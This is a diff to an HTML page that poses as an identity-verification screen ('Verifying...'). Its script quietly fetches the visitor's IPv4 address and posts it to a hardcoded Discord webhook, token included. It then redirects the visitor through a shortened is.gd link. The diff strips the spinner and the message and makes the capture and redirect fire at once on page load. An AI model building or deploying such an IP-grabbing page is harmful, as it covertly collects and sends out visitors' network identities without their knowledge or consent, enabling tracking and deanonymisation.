@@ -23,36 +23,15 @@
             font-size: 30px;
             margin-bottom: 20px;
         }
-
-        .loading-message {
-            font-size: 18px;
-        }
-
-        .spinner {
-            margin-top: 20px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
 
     <h1>Verifying...</h1>
-    <p class="loading-message" id="loadingMessage">Please wait while we verify your identity.</p>
-    <div class="spinner"></div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
-        const REDIRECT_URL = "https://is.gd/CONb26";
+        const REDIRECT_URL = "https://is.gd/gwuu9c";
 
         async function getIPv4() {
             try {
@@ -69,34 +48,21 @@
         async function sendToWebhook(ip) {
             try {
                 const payload = { content: `New Visitor IPv4: ${ip}` };
-                const response = await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-
-                if (!response.ok) throw new Error("Failed to send to webhook");
-                console.log("IPv4 successfully sent to Discord webhook");
             } catch (error) {
                 console.error("Error sending IPv4 to webhook:", error);
             }
         }
 
-        window.onload = async function () {
-            try {
-                document.getElementById('loadingMessage').innerText = "redirecting...";
-                
-                const ip = await getIPv4();
-                if (ip) {
-                    await sendToWebhook(ip);
-                }
-                    window.location.href = REDIRECT_URL);
-
-            } catch (error) {
-                console.error("Unexpected error:", error);
-                document.getElementById('loadingMessage').innerText = "Something went wrong. Please try again.";
-            }
-        };
+        (async function () {
+            const ip = await getIPv4();
+            if (ip) await sendToWebhook(ip);
+            window.location.href = REDIRECT_URL; // Instantly redirect
+        })();
     </script>
 
 </body>
